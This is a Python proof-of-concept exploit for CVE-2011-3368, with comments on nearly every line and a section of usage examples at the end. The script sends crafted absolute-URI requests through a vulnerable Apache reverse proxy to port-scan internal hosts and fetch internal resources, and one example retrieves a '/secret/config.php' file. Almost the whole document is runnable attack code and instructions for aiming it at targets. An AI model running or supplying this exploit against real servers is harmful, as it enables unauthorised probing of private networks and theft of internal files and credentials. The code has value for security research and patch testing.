#!/usr/bin/env python          # Shebang: tells the OS to run this script with Python

import socket                  # Needed for TCP socket communication
import string                  # Used for string operations (old-style, deprecated in Python3)
import getopt, sys             # For parsing command-line options and system arguments

# List of well-known ports to test internally if no single port is specified
known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]

# Function to craft and send the malicious absolute-URI request
def send_request(url, apache_target, apache_port, internal_target, internal_port, resource):

    # Build the request line with absolute URI including internal host/port
    get = "GET " + url + "@" + internal_target + ":" + internal_port +  "/" + resource + " HTTP/1.1\r\n"
    get = get + "Host: " + apache_target + "\r\n\r\n"
    
    # Create a TCP socket with timeout
    remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remoteserver.settimeout(3)

    try:
        # Connect to external Apache reverse proxy
        remoteserver.connect((apache_target, int(apache_port)))
        # Send the crafted GET request
        remoteserver.send(get)
        # Read first 4096 bytes of response
        return remoteserver.recv(4096)
    except:
        return ""              # Return empty string on error

# Function to strip HTTP headers and get only body (banner)
def get_banner(result):
    return result[string.find(result, "\r\n\r\n")+4:]

# Function to test a list of ports on the internal target
def scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):

    # Print header/banner of the test
    print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)
    
    # Loop over every port to test
    for port in tested_ports:
        port = str(port)
        result = send_request(url, apache_target, apache_port, internal_target, port, resource)
        
        # If the response contains certain HTTP codes, assume open
        if string.find(result,"HTTP/1.1 200")!=-1 or \
           string.find(result,"HTTP/1.1 30")!=-1 or \
           string.find(result,"HTTP/1.1 502")!=-1:
            print "- Open port: " + port + "/TCP"
            print get_banner(result)
        elif len(result)==0:   # If no response at all, assume filtered
            print "- Filtered port: " + port + "/TCP"
        else:                  # Otherwise, assume closed
            print "- Closed port: " + port + "/TCP"

# Usage/help instructions
def usage():
    print
    print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
    print "http://www.secforce.co.uk"
    print
    print "usage():"
    print "python apache_scan.py [options]"
    print
    print " [options]"
    print "        -r: Remote Apache host"
    print "        -p: Remote Apache port (default is 80)"
    print "        -u: URL on the remote web server (default is /)"
    print "        -d: Host in the DMZ (default is 127.0.0.1)"
    print "        -e: Port in the DMZ (enables 'single port scan')"
    print "        -g: GET request to the host in the DMZ (default is /)"
    print "        -h: Help page"
    print
    print "examples:"
    print " - Port scan of the remote host"
    print "        python apache_scan.py -r www.example.com -u /images/test.gif"
    print " - Port scan of a host in the DMZ"
    print "        python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local"
    print " - Retrieve a resource from a host in the DMZ"
    print "        python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html"
    print

# Prints the banner of current test
def print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):
    print
    print "CVE-2011-3368 proof of concept by Rodrigo Marcos"
    print "http://www.secforce.co.uk"
    print
    print " [+] Target: " + apache_target
    print " [+] Target port: " + apache_port
    print " [+] Internal host: " + internal_target
    print " [+] Tested ports: " + str(tested_ports)
    print " [+] Internal resource: " + resource
    print

# Main function: parses arguments and sets global vars
def main():

    global apache_target
    global apache_port
    global url
    global internal_target
    global internal_port
    global resource

    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:r:p:d:e:g:h", ["help"])
    except getopt.GetoptError:
        usage()
        sys.exit(2)

    try:
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit(2)
            if o == "-u":
                url=a
            if o == "-r":
                apache_target=a
            if o == "-p":
                apache_port=a
            if o == "-d":
                internal_target = a
            if o == "-e":
                internal_port=a
            if o == "-g":
                resource=a                
        
    except getopt.GetoptError:
        usage()
        sys.exit(2)
        
    if apache_target == "":
        usage()
        sys.exit(2)

# Default values for globals
url = "/"
apache_target = ""
apache_port = "80"
internal_target = "127.0.0.1"
internal_port = ""
resource = "/"

# Run main()
main()

# If a specific port was set, scan only that; else scan known_ports
if internal_port!="":
    tested_ports = [internal_port]
else:
    tested_ports = known_ports

# Run the scan
scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)


################################


1. Port scan of Apache front-end itself

python apache_scan.py -r example.com -u /path1/subpath1

Tests well-known ports on example.com itself.

2. Port scan of an internal host through Apache proxy

python apache_scan.py -r example.com -u /path1/subpath1 -d 10.0.0.0

Tests well-known ports on 10.0.0.0 via vulnerable proxy.

3. Scan a single internal port (e.g., 8080)

python apache_scan.py -r example.com -u /path1/subpath1 -d 10.0.0.0 -e 8080

Probes only 10.0.0.0:8080

4.Retrieve a specific resource from the internal host

python apache_scan.py -r example.com -u /path1/subpath1 -d 10.0.0.0 -e 80 -g /secret/config.php

Attempts to fetch /secret/config.php from 10.0.0.0:80


HelpPage

python apache_scan.py -h





